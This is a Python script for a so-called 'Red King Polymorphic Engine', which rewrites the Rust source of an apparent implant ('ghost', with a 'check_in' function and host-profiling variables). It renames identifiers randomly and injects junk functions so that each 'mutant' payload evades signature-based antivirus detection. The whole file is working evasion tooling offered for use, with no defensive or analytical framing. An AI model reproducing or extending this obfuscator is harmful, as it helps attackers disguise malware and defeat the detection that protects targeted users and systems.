import re
import random
import string
import shutil
import os

class PolymorphEngine:
    """
    🔴 Red King Polymorphic Engine
    Rewrites Rust source code to evade signature-based detection.
    """
    
    def __init__(self, source_path: str, output_path: str):
        self.source_path = source_path
        self.output_path = output_path
        self.mappings = {}

    def _generate_random_name(self, length=12) -> str:
        """Generates a random confusing variable name."""
        return ''.join(random.choices(string.ascii_letters, k=length))

    def _analyze_source(self, code: str):
        """Identifies functions and variables to rename."""
        # Find function names (excluding main)
        funcs = re.findall(r'fn\s+([a-z_][a-z0-9_]*)', code)
        for fn in funcs:
            if fn not in ['main', 'check_in']: # Keep entry points for now
                self.mappings[fn] = self._generate_random_name()

        # Find let bindings
        vars = re.findall(r'let\s+(mut\s+)?([a-z_][a-z0-9_]*)', code)
        for _, var in vars:
             if var not in ['sys', 'hostname', 'os_ver', 'user', 'client', 'query', '_res']:
                 self.mappings[var] = self._generate_random_name()

    def obfuscate(self):
        """Applies obfuscation and saves the new payload."""
        print(f"[*] [POLYMORPH] Reading source: {self.source_path}")
        
        with open(self.source_path, 'r', encoding='utf-8') as f:
            code = f.read()

        self._analyze_source(code)
        
        new_code = code
        for original, obscured in self.mappings.items():
            # Basic replacement (Safety: Need smarter AST parsing for prod)
            # This is a regex boundary replace to avoid partial matches
            new_code = re.sub(r'\b' + re.escape(original) + r'\b', obscured, new_code)
            print(f"   |-- Renamed: {original} -> {obscured}")

        # Inject Junk Code (Dead code insertion)
        junk_func = self._generate_junk_code()
        new_code = new_code.replace("fn main() {", f"{junk_func}\nfn main() {{")
        
        # Ensure output directory exists
        os.makedirs(os.path.dirname(self.output_path), exist_ok=True)
        
        with open(self.output_path, 'w', encoding='utf-8') as f:
            f.write(new_code)
            
        print(f"[!] [POLYMORPH] New mutant generated at: {self.output_path}")
        return True

    def _generate_junk_code(self) -> str:
        """Generates useless math operations to change entropy."""
        name = self._generate_random_name()
        val = random.randint(100, 9999)
        return f"fn {name}() -> i32 {{ let x = {val}; let y = x * 2; return y - x; }}"

if __name__ == "__main__":
    # Test Run
    engine = PolymorphEngine(
        source_path=r"ghost/src/main.rs",
        output_path=r"ghost/src/main_mutant.rs"
    )
    engine.obfuscate()
